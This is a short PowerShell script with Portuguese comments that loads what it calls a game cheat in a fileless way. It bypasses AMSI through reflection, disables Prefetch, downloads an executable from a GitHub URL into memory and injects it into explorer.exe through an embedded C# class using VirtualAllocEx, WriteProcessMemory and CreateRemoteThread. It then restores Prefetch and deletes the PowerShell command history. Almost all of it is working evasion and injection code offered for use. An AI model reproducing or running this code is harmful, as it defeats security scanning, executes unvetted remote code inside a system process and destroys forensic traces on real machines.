# 1. Bypass do AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 2. Desativa o Prefetch temporariamente
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -ErrorAction SilentlyContinue

# 3. Código C# para injetar (AGORA DENTRO DA VARIÁVEL $payload)
$payload = @"
using System;
using System.Runtime.InteropServices;

public class GhostInject {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    public static void Run(string processName, byte[] payload) {
        var procs = System.Diagnostics.Process.GetProcessesByName(processName);
        if (procs.Length == 0) return;
        IntPtr hProc = OpenProcess(0x1F0FFF, false, procs[0].Id);
        IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)payload.Length, 0x1000, 0x40);
        UIntPtr written;
        WriteProcessMemory(hProc, addr, payload, (uint)payload.Length, out written);
        CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        CloseHandle(hProc);
    }
}
"@

# 4. Baixa o cheat em memória
$url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
$bytes = (New-Object System.Net.WebClient).DownloadData($url)

# 5. Carrega o C# na memória
Add-Type -TypeDefinition $payload -Language CSharp

# 6. Injeta no explorer (ou notepad, se preferir)
[GhostInject]::Run("explorer", $bytes)

# 7. Restaura o Prefetch e limpa histórico
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 3 -ErrorAction SilentlyContinue
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
